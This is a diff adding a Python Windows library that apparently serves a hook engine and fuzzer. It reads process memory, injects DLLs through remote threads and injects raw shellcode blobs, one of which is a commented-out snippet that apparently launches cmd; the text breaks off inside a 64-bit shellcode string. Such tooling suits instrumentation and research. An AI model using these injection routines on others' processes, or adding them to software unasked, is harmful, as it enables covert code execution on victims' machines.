@@ -1,0 +1,667 @@
+#Coded by Mist
+ 
+from ctypes import *
+from winappdbg.win32 import *
+from kernel32 import *
+import platform
+import pefile
+import struct
+ 
+UCHAR = BYTE
+PVOID32 = c_int
+LONGLONG = c_longlong
+ULONGLONG = c_ulonglong
+class PEB32(Structure):
+    _pack_   = 8
+    _fields_ = [
+        ("InheritedAddressSpace",               UCHAR),
+        ("ReadImageFileExecOptions",            UCHAR),
+        ("BeingDebugged",                       UCHAR),
+        ("BitField",                            UCHAR),
+        ("Mutant",                              PVOID32),
+        ("ImageBaseAddress",                    PVOID32),
+        ("Ldr",                                 PVOID32 ), # PPEB_LDR_DATA
+        ("ProcessParameters",                   PVOID32 ), # PRTL_USER_PROCESS_PARAMETERS
+        ("SubSystemData",                       PVOID32 ),
+        ("ProcessHeap",                         PVOID32 ),
+        ("FastPebLock",                         PVOID32 ), # PRTL_CRITICAL_SECTION
+        ("AtlThunkSListPtr",                    PVOID32 ),
+        ("IFEOKey",                             PVOID32 ),
+        ("CrossProcessFlags",                   DWORD),
+        ("KernelCallbackTable",                 PVOID32 ),
+        ("SystemReserved",                      DWORD),
+        ("AtlThunkSListPtr32",                  PVOID32 ),
+        ("ApiSetMap",                           PVOID32 ),
+        ("TlsExpansionCounter",                 DWORD),
+        ("TlsBitmap",                           PVOID32 ),
+        ("TlsBitmapBits",                       DWORD * 2),
+        ("ReadOnlySharedMemoryBase",            PVOID32 ),
+        ("HotpatchInformation",                 PVOID32 ),
+        ("ReadOnlyStaticServerData",            PVOID32 ), # Ptr32 Ptr32 Void
+        ("AnsiCodePageData",                    PVOID32 ),
+        ("OemCodePageData",                     PVOID32 ),
+        ("UnicodeCaseTableData",                PVOID32 ),
+        ("NumberOfProcessors",                  DWORD),
+        ("NtGlobalFlag",                        DWORD),
+        ("CriticalSectionTimeout",              LONGLONG),  # LARGE_INTEGER
+        ("HeapSegmentReserve",                  DWORD),
+        ("HeapSegmentCommit",                   DWORD),
+        ("HeapDeCommitTotalFreeThreshold",      DWORD),
+        ("HeapDeCommitFreeBlockThreshold",      DWORD),
+        ("NumberOfHeaps",                       DWORD),
+        ("MaximumNumberOfHeaps",                DWORD),
+        ("ProcessHeaps",                        PVOID32 ), # Ptr32 Ptr32 Void
+        ("GdiSharedHandleTable",                PVOID32 ),
+        ("ProcessStarterHelper",                PVOID32 ),
+        ("GdiDCAttributeList",                  DWORD),
+        ("LoaderLock",                          PVOID32 ), # PRTL_CRITICAL_SECTION
+        ("OSMajorVersion",                      DWORD),
+        ("OSMinorVersion",                      DWORD),
+        ("OSBuildNumber",                       WORD),
+        ("OSCSDVersion",                        WORD),
+        ("OSPlatformId",                        DWORD),
+        ("ImageSubsystem",                      DWORD),
+        ("ImageSubsystemMajorVersion",          DWORD),
+        ("ImageSubsystemMinorVersion",          DWORD),
+        ("ActiveProcessAffinityMask",           DWORD),
+        ("GdiHandleBuffer",                     DWORD * 34),
+        ("PostProcessInitRoutine",              PVOID32 ),
+        ("TlsExpansionBitmap",                  PVOID32 ),
+        ("TlsExpansionBitmapBits",              DWORD * 32),
+        ("SessionId",                           DWORD),
+        ("AppCompatFlags",                      ULONGLONG), # ULARGE_INTEGER
+        ("AppCompatFlagsUser",                  ULONGLONG), # ULARGE_INTEGER
+        ("pShimData",                           PVOID32 ),
+        ("AppCompatInfo",                       PVOID32 ),
+        ("CSDVersion",                          PVOID32),
+        ("ActivationContextData",               PVOID32 ), # ACTIVATION_CONTEXT_DATA
+        ("ProcessAssemblyStorageMap",           PVOID32 ), # ASSEMBLY_STORAGE_MAP
+        ("SystemDefaultActivationContextData",  PVOID32 ), # ACTIVATION_CONTEXT_DATA
+        ("SystemAssemblyStorageMap",            PVOID32 ), # ASSEMBLY_STORAGE_MAP
+        ("MinimumStackCommit",                  DWORD),
+        ("FlsCallback",                         PVOID32 ), # PFLS_CALLBACK_INFO
+        ("FlsListHead",                         PVOID32 ),
+        ("FlsBitmap",                           PVOID32 ),
+        ("FlsBitmapBits",                       DWORD * 4),
+        ("FlsHighIndex",                        DWORD),
+        ("WerRegistrationData",                 PVOID32 ),
+        ("WerShipAssertPtr",                    PVOID32 ),
+        ("pContextData",                        PVOID32 ),
+        ("pImageHeaderHash",                    PVOID32 ),
+        ("TracingFlags",                        DWORD),
+    ]
+ 
+ 
+#Any windows api calls with a xxx prefix are used when its not available from winappdbg or the functionality is not correct for my needs.
+#they are just plain wrappers for ctypes windll api calls
+ 
+class Process:
+    """Manages the basic process functions
+     
+    1.Process enumeration
+    2.Process information retrieval
+    3.Process creation, code injection etc"""
+    
+   
+   
+    def __del__(self):
+        print 'closing handle to process'
+        CloseHandle(self.handle)
+        if self.process_info:
+            CloseHandle(self.process_info.hThread)
+   
+ 
+ 
+    def __init__(self,  pid,  process_info = None):
+        '''Initialized with a process pid, but process information structure can be passed in for
+        processes created by the caller'''
+         
+        self.pid = pid
+         
+        if process_info:
+            self.process_info = process_info
+            self.pid = self.process_info.dwProcessId
+            self.handle = self.process_info.hProcess
+        else:
+            self.process_info = None
+            self.handle = OpenProcess(PROCESS_ALL_ACCESS, False, int(self.pid))
+         
+        if not self.handle:
+            raise Exception("Process.__init__: Create object error, null handle value\n") 
+   
+   
+             
+    def ResumeSuspendedProcess(self):
+        '''Resume a  suspended process that we have created so that it can be attached to
+        by a debugger or so that the hook engine can do its work'''
+         
+        try:
+            if not self.process_info:
+                raise Exception("Missing Process_Information structure\n")
+                 
+            if ResumeThread(self.process_info.hThread) == -1:
+                raise Exception("ResumeThread return -1\n")
+                 
+            #xxxSleep(500)
+             
+        except Exception, e: 
+            raise Exception("Process.ResumeSuspendedProcess: Couldn't resume thread; %s\n" % str(e))
+             
+             
+             
+    def is32BitProcess(self):
+        """Determine whether or not this process is 32bit
+         
+        Uses the PID value from the initialized Process object"""
+         
+        self.os = platform.architecture()[0]
+        if self.os == '32bit': 
+            return True
+             
+        try:    
+            val = IsWow64Process(self.handle)
+            return val
+         
+        except Exception, e: 
+            raise Exception("Process.is32BitProcess: Couldn't determine process bitness; %s\n" % str(e))
+     
+   
+   
+    def GetProcessEntryPoint(self):
+        '''***Works with processes created suspended***
+        '''
+        try:
+            module_base = self.GetProcessBaseAddr()
+            pe =  pefile.PE(self.GetProcessName(), fast_load=True)
+            return pe.OPTIONAL_HEADER.AddressOfEntryPoint + module_base
+             
+        except Exception, e: 
+            raise Exception("Process.GetProcessEntryPoint: Couldn't determine process entry point; %s\n" % str(e))
+   
+   
+   
+    def GetProcessName(self):
+        try:
+            return QueryFullProcessImageNameW(self.handle)
+             
+        except Exception, e: 
+            raise Exception("Process.GetProcessName: Couldn't determine process name; %s\n" % str(e))
+         
+         
+         
+    def GetProcessPEB(self):
+        """Get the PEB struct for this process"""
+        try:
+            pi = NtQueryInformationProcess(self.handle, ProcessBasicInformation)
+            if self.is32BitProcess():
+                offset32bit =  pi.PebBaseAddress - 0x1000
+                peb_buffer = PEB32()
+                buff_size = sizeof(PEB32)
+            else:
+                offset32bit =  pi.PebBaseAddress
+                peb_buffer = PEB()
+                buff_size = sizeof(PEB)
+             
+            bytes_read = c_size_t(0)
+             
+            if not xxxReadProcessMemory(self.handle, offset32bit, byref(peb_buffer),  buff_size,  byref(bytes_read)):
+                raise Exception("Couldn't read process memory")
+             
+             
+            return peb_buffer
+             
+        except Exception, e: 
+            raise Exception("Process.GetProcessPEB: Couldn't get PEB structure; %s\n" % str(e))
+         
+         
+         
+    def GetProcessBaseAddr(self):
+        return self.GetProcessPEB().ImageBaseAddress
+     
+     
+     
+    def GetProcessModuleBaseEx(self,  full_module_path = None):
+        '''This method is incomplete: I was going to use it as a work around for the GetProcessModuleBase method
+        which doesn't work on processes created in a suspended state, but I found out the peb is not fully initialized at this 
+        point so using this technique will not work
+        '''
+         
+        peb = self.GetProcessPEB()
+        ldr_module = LDR_MODULE()
+        bytes_read = c_size_t(0)
+        buff_size = sizeof(LDR_MODULE)
+        print 'peb.Ldr',  peb.Ldr
+         
+        if not xxxReadProcessMemory(self.handle, peb.Ldr, byref(ldr_module),  buff_size,  byref(bytes_read)):
+                raise Exception("Couldn't read process memory")
+                 
+        print ldr_module.FullDllName, 'base address',  hex(ldr_module.BaseAddress)
+         
+   
+   
+    def GetProcessModuleBase(self,  full_module_path):
+        """Get a the base address of a module belonging to a 32bit process, doing so from a 64bit process
+        ***Does not work with processes created suspended, but does work with fully loaded suspended processess***
+         
+        for full_module_path we need full path and name to distinguish the right modules as there may be 2 or more modules 
+        with the same name ie kernel32.dll, ntdll.dll 32 and 64bit versions etc"""
+        TH32CS_SNAPMODULE32 = 0x00000010
+        hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, self.pid )
+         
+        module = Module32First(hSnapshot)
+        while module is not None:
+            if module.szExePath.lower() == str(full_module_path.lower()):
+                return module.modBaseAddr
+            module = Module32Next(hSnapshot)
+             
+        return None
+         
+         
+         
+    def Get32bitProcAddr(self,  full_module_path,  func_name):
+        """GetProcAddress for 32bit modules but called from 64bit processes
+         
+        requires the full module path and name plus the function name to resolve.
+        For full_module_path we need full path and name to distinguish the right modules as there may be 2 or more modules 
+        with the same name ie kernel32.dll, ntdll.dll 32 and 64bit versions etc"""
+        try:
+            module_base = self.GetProcessModuleBase(full_module_path)
+            if not module_base: return 0
+            pe =  pefile.PE(full_module_path, fast_load=True)
+            pe.parse_data_directories( directories=[ pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']] )
+            return [exp.address + module_base for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols if exp.name == func_name][0]
+         
+        except Exception, e: 
+            raise Exception("Process.Get32bitProcAddr: Error getting function address; %s\n" % str(e))
+         
+         
+         
+    def CallRemoteLibFunc(self, remote_lib,  remote_func):
+        """Call a function in a library that we have injected into the process in question. 
+        This function is a wrapper for InjectLibInternal
+         
+        """
+        return self.InjectLibInternal( lib_containing_func=remote_lib,  func_to_call=remote_func)
+ 
+ 
+ 
+    def InjectLibrary(self,  lib_name):
+        '''InjectLibrary is wrapper for InjectLibInternal that injects a library into the process
+         
+        '''
+        lib_name = unicode(lib_name)
+        return self.InjectLibInternal(load_lib_path=lib_name)
+         
+         
+         
+    def InjectCode(self):#,  code,  code_len):
+        '''InjectCode injects shellcode into the process
+        takes a buffer containing shellcode and its length as a parameter
+        just testing shellcode for now'''
+ 
+#        code = \
+#        "\xcc\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x83\xec\x60"\
+#        "\x6a\x02\x6a\x02\x68\x7e\xd8\xe2\x73\x68\x98\xfe\x8a\x0e\x55\x8b\xec\x8b\xd8\x50"\
+#        "\x03\x40\x3c\x03\x58\x78\x58\x8b\x4b\x10\x49\x8b\x53\x1c\x03\xd0\x8b\x73\x20\x03"\
+#        "\xf0\x8b\x5b\x24\x03\xd8\x8b\x34\x8e\x03\xf0\x50\x33\xc0\x8b\xf8\xac\x84\xc0\x74"\
+#        "\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x41\x8b\x45\x0c\x3b\x7c\x85\x00\x74\x05\x48\x74"\
+#        "\xe3\xeb\xf5\x51\x49\x0f\xb7\x0c\x4b\x8b\x0c\x8a\x03\x4c\x24\x04\x89\x4c\x85\x00"\
+#        "\x59\x58\xff\x4d\x10\x75\xc8\x68\x63\x6d\x64\x00\x8b\xdc\x6a\x00\x53\xff\x55\x04"\
+#        "\xff\x55\x08"
+         
+        code = \
+"\xe9\x56\x02\x00\x00\x41\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x46\x75\x6e\x63\x74\x69\x6f\x6e\x73\x48\x6f\x6f\x6b\x65\x64\x00\x00"\
+"\x00\x00\x00\xcc\x48\x8b\x04\x24\xeb\x08\x00\x00\x00\x00\x00\x00\x00\x00\xcc\x48"\
+"\x8d\x0d\xf0\xff\xff\xff\x48\x89\x01\x49\x89\xc7\x48\x8d\x1d\xc8\xff\xff\xff"
+         
+        code_len = len(code)
+        code_address = VirtualAllocEx(self.handle, None,  code_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+         
+        written = c_size_t(0)
+        xxxWriteProcessMemory(self.handle, code_address, code, code_len,  byref(written))
+         
+        thread_id = c_ulong(0)
+        h_thread =xxxCreateRemoteThread(self.handle,None,0, code_address, None,0,byref(thread_id))
+        WaitForSingleObject(h_thread, INFINITE)
+         
+         
+         
+    def InjectLibInternal(self,  lib_containing_func=u"kernel32.dll",  func_to_call=u"LoadLibraryW",  load_lib_path=None,  code_buffer=None):  
+        """defaults to injecting a library, but can also start a thread in a remote process
+        to execute an exported function in a library already loaded by the remote process
+         
+        """
+         
+        # Get a handle to the process we are injecting into.
+        try:
+            arg_address = None   
+             
+            # if we are not loading a dll into a remote process then skip this code 
+            #************ fix up for code injection too**************    
+            if load_lib_path != None:
+                dll_len  = len(load_lib_path) * 2 #unicode string needs twice the space
+                # Allocate some space for the DLL path
+                arg_address = VirtualAllocEx(self.handle, None,  dll_len, MEM_COMMIT, PAGE_READWRITE)
+                 
+                # Write the DLL path into the allocated space
+                written = c_size_t(0)
+                xxxWriteProcessMemory(self.handle, arg_address, load_lib_path, dll_len,  byref(written))
+             
+            # We need to resolve the address for the function in the remote library
+            # This is a 64bit process so it isn't going to resolve properly for native 
+            # libraries like kernel32.dll in a 32bit process etc, so we need to check first
+            is32bit = self.is32BitProcess()
+            if is32bit and lib_containing_func == "kernel32.dll":
+                path_len = xxxGetSystemWow64DirectoryW(None,  0)
+                wow64dir = create_unicode_buffer(path_len + 1)
+                xxxGetSystemWow64DirectoryW(byref(wow64dir),  path_len)
+                lib_containing_func = wow64dir.value + '\\' + lib_containing_func
+             
+            #1.See if its already loaded ****May create race condition here by using GetModuleHandle ****
+            h_lib = xxxGetModuleHandleW(lib_containing_func)
+            if not h_lib:
+                #2.Its not so try using loadlibrary
+                h_lib = xxxLoadLibraryW(lib_containing_func)
+                 
+                #3.Its either a typo or a 32bit library so try Get32bitProcAddr(lib_containing_func,  func_to_call)
+                #which implicitly calls GetProcessModuleBase(full_module_path)
+                if not h_lib:
+                    h_func = self.Get32bitProcAddr(lib_containing_func,  func_to_call)
+                else:
+                    h_func  = xxxGetProcAddress(h_lib,str(func_to_call))
+            else:
+                h_func  = xxxGetProcAddress(h_lib,str(func_to_call))
+      
+            if not h_func:
+                raise Exception("Process.InjectLibInternal: Couldn't acquire a get remote function address - %s\n" % self.pid)
+             
+            thread_id = c_ulong(0)
+            h_thread =xxxCreateRemoteThread(self.handle,None,0,h_func,arg_address,0,byref(thread_id))
+            WaitForSingleObject(h_thread, INFINITE)
+            #************Maybe don't exit, need to examine needs of fuzzer
+             
+            print "[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value
+            return True
+             
+        except Exception, e: 
+            raise Exception("Process.InjectLibInternal: Failed to inject the code; %s\n" % str(e))
+             
+              
+         
+ 
+ 
+    def InjectSuspendedProcess(self,  lib_name,  func_name):
+        """This method is specifically for injecting processes created in a suspended state,
+        it allows the library to be injected via a small piece of injected code, the code then can call
+        the exported library function. 
+        The pic shellcode is the mechanism that does the work in the remote process.
+         
+        lib_name = library to inject
+        func_name = function from the library to call upon injection
+         
+        XXX To Do
+        1.add check for system range of allocatable addresses 
+        2.add check to see if virtual memory is assigned if not then try again
+        """
+         
+        #this from the binary file HookLoader32bit.bin
+        inject_code32 = \
+        "\xe9\x56\x02\x00\x00\x41\x00\x00\x00\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x46\x75\x6e\x63\x74\x69\x6f\x6e\x73\x48\x6f\x6f\x6b\x65\x64\x00\x00"\
+        "\x00\x00\x00\x9c\x60\x8b\x44\x24\x24\x25\x00\x00\xff\xff\x81\x38\x4d\x5a\x90\x00"\
+        "\x74\x0b\x2d\x00\x00\x01\x00\xeb\xf1\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x5d\x81"\
+        "\xed\x7e\x02\x00\x00\xe8\xcd\x00\x00\x00\x8d\x45\x35\x50\xff\x95\x22\x04\x00\x00"\
+        "\x8d\x8d\x3e\x01\x00\x00\x51\x50\xff\x95\x1e\x04\x00\x00\xff\xd0\x8d\x85\xf0\x03"\
+        "\x00\x00\x50\x8b\x8d\x75\x02\x00\x00\x51\xff\x95\x1e\x04\x00\x00\x89\x85\x26\x04"\
+        "\x00\x00\x8d\x85\xff\x03\x00\x00\x50\x8b\x8d\x75\x02\x00\x00\x51\xff\x95\x1e\x04"\
+        "\x00\x00\x89\x85\x2a\x04\x00\x00\x8d\x85\x13\x04\x00\x00\x50\x8b\x8d\x75\x02\x00"\
+        "\x00\x51\xff\x95\x1e\x04\x00\x00\x89\x85\x2e\x04\x00\x00\x8d\x8d\x47\x02\x00\x00"\
+        "\x51\x6a\x00\x68\x03\x00\x1f\x00\xff\x95\x2e\x04\x00\x00\x6a\xff\x50\xff\x95\x2a"\
+        "\x04\x00\x00\x8d\x85\x57\x02\x00\x00\x50\x6a\x40\x8b\x4d\x09\x51\x8b\x7d\x05\x57"\
+        "\xff\x95\x26\x04\x00\x00\x8b\x4d\x09\x8d\x75\x0d\x8b\x7d\x05\xf3\xa4\x8d\x85\x57"\
+        "\x02\x00\x00\x50\x8b\x85\x57\x02\x00\x00\x50\x8b\x4d\x09\x51\x8b\x7d\x05\x57\xff"\
+        "\x95\x26\x04\x00\x00\xff\x75\x05\x58\x61\x9d\xff\x64\x24\xd8\x8d\xbd\xd4\x03\x00"\
+        "\x00\x89\x85\x75\x02\x00\x00\x89\xc1\x03\x41\x3c\x03\x48\x78\x8b\x41\x1c\x03\x85"\
+        "\x75\x02\x00\x00\x8b\x51\x18\x8b\x59\x24\x03\x9d\x75\x02\x00\x00\x8b\x71\x20\x03"\
+        "\xb5\x75\x02\x00\x00\x31\xc9\x56\x8b\x34\x8e\x03\xb5\x75\x02\x00\x00\x51\x57\x8d"\
+        "\x8d\xe3\x03\x00\x00\x29\xf9\xf3\xa6\x5f\x59\x5e\x74\x03\x41\xeb\xe2\x31\xff\x66"\
+        "\x8b\x3c\x4b\x8b\x0c\xb8\x03\x8d\x75\x02\x00\x00\x89\x8d\x1e\x04\x00\x00\x8d\x85"\
+        "\xe3\x03\x00\x00\x50\xff\xb5\x75\x02\x00\x00\xff\xd1\x89\x85\x22\x04\x00\x00\xc3"\
+        "\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x4c\x6f\x61\x64\x4c"\
+        "\x69\x62\x72\x61\x72\x79\x41\x00\x56\x69\x72\x74\x75\x61\x6c\x50\x72\x6f\x74\x65"\
+        "\x63\x74\x00\x57\x61\x69\x74\x46\x6f\x72\x53\x69\x6e\x67\x6c\x65\x4f\x62\x6a\x65"\
+        "\x63\x74\x00\x4f\x70\x65\x6e\x45\x76\x65\x6e\x74\x41\x00\x00\x00\x00\x00\x00\x00"\
+        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+         
+        #this from the binary file HookLoader64bit.bin
+          
+        inject_code64 = \
+       "\xe9\x5e\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
